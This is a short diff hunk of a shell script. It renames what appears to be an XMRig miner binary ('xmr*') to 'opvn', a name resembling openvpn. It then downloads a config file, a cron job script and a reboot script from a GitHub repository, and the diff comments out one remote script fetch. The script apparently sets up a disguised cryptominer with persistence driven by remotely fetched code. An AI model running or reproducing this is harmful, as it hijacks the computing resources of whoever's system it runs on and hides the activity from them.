@@ -7,7 +7,7 @@ mv xmr* opvn
 
 rm -rf config.json
 wget https://raw.githubusercontent.com/bondbenz1821/opme/main/config.json
-wget https://raw.githubusercontent.com/bondbenz1821/opme/main/opvn.sh
+#wget https://raw.githubusercontent.com/bondbenz1821/opme/main/opvn.sh
 wget https://raw.githubusercontent.com/bondbenz1821/opme/main/cronjob.sh
 wget https://raw.githubusercontent.com/bondbenz1821/opme/main/reboot.sh
 
